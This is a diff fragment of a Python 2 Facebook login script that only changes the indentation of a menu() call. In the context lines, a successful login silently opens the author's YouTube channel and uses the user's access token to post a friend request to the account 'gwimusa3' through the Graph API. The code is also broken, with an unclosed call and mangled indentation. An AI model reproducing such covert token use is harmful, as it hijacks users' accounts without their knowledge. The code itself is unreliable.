@@ -252,7 +252,7 @@ def login():
 					print '\n\x1b[1;95mLogin Successful.•◈•..'
 					os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 					requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token']
-						      menu()
+					menu()
 						      except requests.exceptions.ConnectionError:
 						      print"\n\x1b[1;91mThere is no internet connection"
 						      keluar()
